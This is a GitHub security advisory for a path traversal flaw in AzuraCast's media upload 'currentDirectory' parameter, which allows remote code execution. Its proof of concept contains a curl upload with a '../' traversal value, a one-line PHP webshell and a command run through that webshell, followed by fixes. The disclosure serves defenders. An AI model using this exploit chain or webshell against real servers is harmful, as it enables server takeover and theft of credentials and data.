# [H] AzuraCast has Path Traversal in `currentDirectory` Parameter that Enables Remote Code Execution via Media Upload

## Summary
Severity: High
Advisory: GHSA-vp2f-cqqp-478j
CVE: CVE-2026-42605
CWE: CWE-22
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-04
Source: https://github.com/advisories/GHSA-vp2f-cqqp-478j
Type: github-advisory

## Affected
- Packagist: `azuracast/azuracast` — affected >=0 <0.23.6

## Details
## Summary

The `currentDirectory` request parameter in the Flow.js media upload endpoint (`POST /api/station/{station_id}/files/upload`) is not sanitized for path traversal sequences. When combined with a local filesystem storage backend (the default), an authenticated user with media management permissions can write arbitrary files outside the station's media storage directory, achieving remote code execution by writing a PHP webshell to the web root.

## Details

In `backend/src/Controller/Api/Stations/Files/FlowUploadAction.php`, the `currentDirectory` parameter is read directly from user input at line 79 and prepended to the sanitized filename at line 83:

```php
// FlowUploadAction.php:79-84
$currentDir = Types::string($request->getParam('currentDirectory'));

$destPath = $flowResponse->getClientFullPath();
if (!empty($currentDir)) {
    $destPath = $currentDir . '/' . $destPath;
}
```

While `$flowResponse->getClientFullPath()` is sanitized via `UploadedFile::filterClientPath()` (which strips `..` segments), the `$currentDir` value is prepended **after** this sanitization, reintroducing traversal capability.

This `$destPath` is passed to `MediaProcessor::processAndUpload()` at line 95-98. The critical issue is in the `finally` block at `backend/src/Media/MediaProcessor.php:114-117`:

```php
// MediaProcessor.php:75-117
try {
    if (MimeType::isFileProcessable($localPath)) {
        // ... process media ...
        return $record;
    }
    // ...
    throw CannotProcessMediaException::forPath($path, 'File type cannot be processed.');
} catch (CannotProcessMediaException $e) {
    $this->unprocessableMediaRepo->setForPath($storageLocation, $path, $e->getMessage());
    throw $e;
} finally {
    $fs->uploadAndDeleteOriginal($localPath, $path);  // ALWAYS executes
}
```

The `finally` block writes the file to the traversed path **regardless** of whether the file passes MIME type validation. A `.php` file triggers `CannotProcessMediaException`, but the `finally` block still copies it to the destination before the exception propagates.

For local storage (the default), `LocalFilesystem::upload()` at `backend/src/Flysystem/LocalFilesystem.php:45-57` resolves the path via `getLocalPath()`:

```php
// LocalFilesystem.php:45-57
public function upload(string $localPath, string $to): void
{
    $destPath = $this->getLocalPath($to);  // PathPrefixer::prefixPath() — simple concatenation
    $this->ensureDirectoryExists(dirname($destPath), ...);
    copy($localPath, $destPath);  // OS resolves ../
}
```

`getLocalPath()` delegates to `PathPrefixer::prefixPath()` (League Flysystem), which performs simple string concatenation without normalization. This **bypasses** the `WhitespacePathNormalizer` that would catch traversal if the path went through the standard `Filesystem::write()`/`writeStream()` methods. The OS-level `copy()` then resolves `../` sequences, writing outside the media root.

Note: `RemoteFilesystem::upload()` uses `$this->writeStream()` which DOES go through the normalizer, so S3/remote backends are not affected. Only local storage (the default configuration) is vulnerable.

The route at `backend/config/routes/api_station.php:399-405` requires `StationPermissions::Media` — a permission granted to DJs and station managers, not only admins.

## PoC

Assuming AzuraCast is running locally with a station (ID 1) using local filesystem storage and the attacker has a valid API key with Media permissions:

**Step 1: Upload a PHP webshell via path traversal**

```bash
curl -X POST "http://localhost/api/station/1/files/upload" \
  -H "Authorization: Bearer <API_KEY_WITH_MEDIA_PERMISSION>" \
  -F "flowTotalChunks=1" \
  -F "flowChunkNumber=1" \
  -F "flowCurrentChunkSize=44" \
  -F "flowTotalSize=44" \
  -F "flowIdentifier=abc123" \
  -F "flowFilename=shell.php" \
  -F "currentDirectory=../../../../../var/azuracast/www/public" \
  -F "file_data=@shell.php"
```

Where `shell.php` contains:
```php
<?php system($_GET['cmd']); ?>
```

Expected response: An error JSON (because `.php` is not a processable media type), but the file has already been written by the `finally` block.

**Step 2: Execute commands via the webshell**

```bash
curl "http://localhost/shell.php?cmd=id"
```

Expected output:
```
uid=1000(azuracast) gid=1000(azuracast) groups=1000(azuracast)
```

## Impact

- **Remote Code Execution**: An authenticated user with DJ or station manager privileges can write arbitrary PHP files to the web root and execute arbitrary system commands as the AzuraCast application user.
- **Full Server Compromise**: The attacker can read configuration files (database credentials, API keys), access all station data, modify application code, and potentially escalate to root depending on system configuration.
- **Privilege Escalation**: A DJ-level user (lowest privileged role with media access) can achieve the equivalent of full system administrator access.
- **Data Exfiltration**: All station data, user credentials, and application secrets become accessible.

## Recommended Fix

Sanitize `currentDirectory` in `FlowUploadAction.php` using the same `filterClientPath()` method used for filenames:

```php
// FlowUploadAction.php — replace line 79:
$currentDir = Types::string($request->getParam('currentDirectory'));

// With:
$currentDir = UploadedFile::filterClientPath(
    Types::string($request->getParam('currentDirectory'))
);
```

Additionally, harden `LocalFilesystem::upload()` to normalize paths before use:

```php
// LocalFilesystem.php — add path normalization in upload():
public function upload(string $localPath, string $to): void
{
    $normalizer = new WhitespacePathNormalizer();
    $to = $normalizer->normalizePath($to);  // Throws PathTraversalDetected on ../

    $destPath = $this->getLocalPath($to);
    $this->ensureDirectoryExists(
        dirname($destPath),
        $this->visibilityConverter->defaultForDirectories()
    );

    if (!@copy($localPath, $destPath)) {
        throw UnableToCopyFile::fromLocationTo($localPath, $destPath);
    }
}
```

Also sanitize `flowIdentifier` in `Flow.php:67` to prevent secondary traversal in chunk directory creation.

## References
- https://github.com/AzuraCast/AzuraCast/security/advisories/GHSA-vp2f-cqqp-478j
- https://nvd.nist.gov/vuln/detail/CVE-2026-42605
- https://github.com/AzuraCast/AzuraCast/commit/18c793b4427eb49e67a2fea99a89f1c9d9dd808d
- https://github.com/AzuraCast/AzuraCast
- https://github.com/AzuraCast/AzuraCast/releases/tag/0.23.6
